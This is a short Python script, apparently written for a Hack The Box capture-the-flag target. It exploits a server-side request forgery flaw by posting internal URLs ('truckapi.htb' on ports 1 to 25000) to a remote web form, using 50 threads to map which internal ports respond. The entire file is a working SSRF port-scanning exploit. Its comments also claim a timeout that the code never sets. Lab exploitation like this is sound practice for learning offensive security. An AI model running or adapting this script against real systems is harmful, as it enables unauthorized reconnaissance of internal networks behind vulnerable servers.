#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

proxy = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"}

def check_port(port):
    """
    Checks if a port is open and returns the response if successful.
    Returns "Not Found" if there's a connection error or the response isn't what we expect.
    """
    try:
        # Construct the URL to check
        api_url = "http://94.237.57.115:35304"
        post_data = f"api=http://truckapi.htb:{port}/"

        # Define the headers.  Use your sample ones.
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        # Send the request.  Timeout is crucial for speed.
        response = requests.post(api_url, headers=headers, verify=False, proxies=None, data=post_data)

        # Check if response includes the following string - Failed to connect
        if "Failed to connect" in response.text:
            pass
        else:
            return f"Port {port}: Success - {response.text[:100]}"  # Display first 100 chars

    except requests.exceptions.RequestException as e:
        return f"Port {port}: Not Found - Error: {e}"
    except socket.timeout:
        return f"Port {port}: Not Found - Timeout"

def main():
    """
    Scans ports 1-25000 using concurrent futures.
    """
    max_threads = 50  # Reduced thread count to optimize resource usage
    ports_to_scan = range(1, 25001)

    # Create a ThreadPoolExecutor with a limited number of threads (max_threads)
    # This helps manage resource usage while scanning a large range of ports
    with ThreadPoolExecutor(max_threads) as executor:
        # Submit tasks to the executor for each port in the range
        # Each task calls the check_port function with a specific port
        futures = [executor.submit(check_port, port) for port in ports_to_scan]

        # Process the results as they complete
        # as_completed ensures we handle futures in the order they finish
        for future in as_completed(futures):
            # Get the result of the completed future
            result = future.result()
            if result is not None:
                # Print the result if it's not None
                print(result)

if __name__ == "__main__":
    main()